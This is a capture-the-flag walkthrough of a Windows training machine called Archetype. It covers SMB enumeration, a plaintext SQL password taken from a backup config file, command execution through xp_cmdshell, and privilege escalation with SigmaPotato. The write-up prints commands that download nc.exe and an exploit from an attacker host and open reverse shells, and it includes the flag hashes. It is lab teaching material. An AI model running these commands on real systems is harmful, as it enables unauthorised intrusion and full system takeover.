System: Windows
Difficulty: Very Easy

IP Address: 10.129.95.187

# User Flag

NMAP Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.95.187 -sC -sV
```

Here are the results. 5 Ports have been returned.
```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.95.187:1433:
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-11-04T19:56:44+00:00; +1s from scanner time.
| ms-sql-info:
|   10.129.95.187:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-11-04T19:39:41
|_Not valid after:  2056-11-04T19:39:41
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

An SMB Server has been detected. The shares will be enumerated.
```
kali@kali:~$ smbclient -L 10.129.95.187
```

Here is the listing of the files.
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
```

The share is accessed and the suspicious file is downloaded.
```
kali@kali:~$ smbclient //10.129.95.187/backups
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		5056511 blocks of size 4096. 2618185 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (4.9 KiloBytes/sec) (average 4.9 KiloBytes/sec)
smb: \> exit
```

After observing the downloaded file, it is possible to see a password.
```
kali@kali:~$ cat prod.dtsConfig
```

```
<SNIP>
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

The password is `M3g4c0rp123`.

A connection is attempted to the MSSQL Server.
```
impacket-mssqlclient sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```

A shell gain is attempted.
```
enable_xp_cmdshell
```

A shell has be successfully gained from the MSSQL Server.
```
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Both a shell receiver and webserver will be listening on attacker's machine in order to get a clean shell.
```
sudo nc -lvnp 4444
```

```
sudo python3 -m http.server 8080
```

The `nc.exe` file required for remote access is downloaded to the system and then executed from the victim machine to connect directly to the attacker machine.
```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c wget http://10.10.14.154:8080/nc.exe -o C:\Users\sql_svc\nc.exe"
output
------
NULL
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c C:\Users\sql_svc\nc.exe 10.10.14.154 4444 -e powershell.exe"
```

A shell has been successfully returned on port 4444.
```
Connection received on 10.129.95.187 49676
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

Here are the user flag contents in the `C:\Users\sql_svc` directory.
```
3e7b102e78218e935bf3f4951fec21a3
```

# Root Flag

The privileges are enumerated through this command.
```
PS C:\Users\sql_svc\Desktop> whoami /priv
```

It is possible to see `SeImpersonatePrivilege` enabled, which can be exploited.
```
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The exploit is downloaded directly from the listening attacker machine.
```
wget http://10.10.14.154:8080/SigmaPotato.exe -o sp.exe
```

Listen to another port on the attacker's machine.
```
sudo nc -lvnp 4445
```

The exploit is executed with the address to another listening port.
```
.\sp.exe --revshell 10.10.14.154 4445
```

The root flag contents are in the `C:\Users\Administrator\Desktop` directory.
```
b91ccec3305e98240082d4474b848528
```